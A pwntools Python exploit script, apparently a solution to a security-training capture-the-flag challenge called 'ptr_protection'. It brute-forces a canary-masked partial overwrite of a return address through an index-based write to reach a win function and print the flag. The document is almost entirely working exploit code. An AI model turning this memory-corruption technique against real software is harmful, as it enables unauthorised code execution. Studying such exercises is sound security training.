from pwn import *
from tqdm import tqdm
aslr=True
for count in tqdm(range(10_000)):
    if args.GDB:
        p = gdb.debug("./ptr_protection", gdbscript=GDB_COMMANDS, aslr=aslr)
    elif args.REMOTE:
        p = remote(f"ptr-protection.training.offensivedefensive.it", 8080, ssl=aslr)
    else:
        p = process("./ptr_protection", aslr=aslr, timeout=3)

    ret_addr_offset = 0x28
    canary_offset   = 0x20

    # win function address, will work once in 16 tries
    win__ret_addr_end = 0x52, 0x7c
    main_ret_addr_end = 0x55, 0xfe
    if args.SOL:
        canary_7_byte = int(input("canary high byte:\n"), 16)
    else:
        canary_7_byte = int(random.random()*256)^main_ret_addr_end[1]

    # # test: writing sequential values
    # for i in range(0, 16):
    #     p.recvuntil(b"index:")
    #     p.sendline(str(i).encode())
    #     p.recvuntil(b"data: ")
    #     p.sendline(str(i).encode())
    # print("Sequential values written")

    # high byte xored with the canary must be the same as the last byte of the return address
    p.recvuntil(b"index:")
    p.sendline(str(ret_addr_offset+1).encode())
    p.recvuntil(b"data: ")
    p.sendline(str(
        canary_7_byte^win__ret_addr_end[0]
        ).encode())

    p.recvuntil(b"index:")
    p.sendline(str(ret_addr_offset).encode())
    p.recvuntil(b"data: ")
    p.sendline(str(win__ret_addr_end[1]).encode())

    p.sendline(b"-1")
    try:
        output = p.recvuntil(b"WIN!")
        print("WIN")
        print(p.recvuntil(b"}"))
        for _ in range(10):
            print("\a")
            break
    except Exception as e:
        print(e)
    finally:
        pass
    p.close()
